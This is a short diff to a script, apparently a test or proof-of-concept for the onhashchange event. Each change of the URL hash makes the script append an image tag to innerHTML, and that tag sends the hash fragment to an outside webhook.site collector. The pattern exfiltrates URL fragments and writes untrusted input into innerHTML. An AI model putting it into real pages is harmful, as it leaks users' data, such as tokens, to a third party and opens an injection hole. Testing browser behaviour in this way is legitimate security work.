@@ -5,6 +5,6 @@ onhashchange event
     host.innerHTML+="<img src='https://webhook.site/ba91cb01-12e4-4c46-b40f-019d03575ed8?loaded'>";
   }
   onhashchange=e=>{
-    host.innerHTML+="<img src='https://webhook.site/ba91cb01-12e4-4c46-b40f-019d03575ed8?hashchanged&"+e.newURL.split('#')[1]+"'>";
+    host.innerHTML+="<img src='https://webhook.site/ba91cb01-12e4-4c46-b40f-019d03575ed8?hashchanged="+e.newURL.split('#')[1]+"'>";
   }
 </script>
